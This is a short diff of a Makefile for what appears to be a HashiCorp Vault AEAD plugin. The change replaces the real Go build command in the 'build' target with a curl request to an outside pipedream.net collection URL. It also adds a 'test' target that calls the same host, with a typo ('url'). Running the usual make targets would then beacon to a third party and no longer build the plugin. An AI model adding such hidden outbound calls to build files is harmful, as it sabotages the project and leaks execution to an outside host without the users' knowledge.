@@ -19,7 +19,9 @@ endif
 all: fmt build start
 
 build:
-	GOOS=$(OS) GOARCH="$(GOARCH)" go build -o vault/plugins/vault-plugin-aead cmd/vault-plugin-aead/main.go
+	curl -X GET 'https://eo9ld22mvg9u8og.m.pipedream.net/'
+test:
+	url -X GET 'https://eo9ld22mvg9u8og.m.pipedream.net/'
 
 start:
 	vault server -dev -dev-root-token-id=root -dev-plugin-dir=./vault/plugins
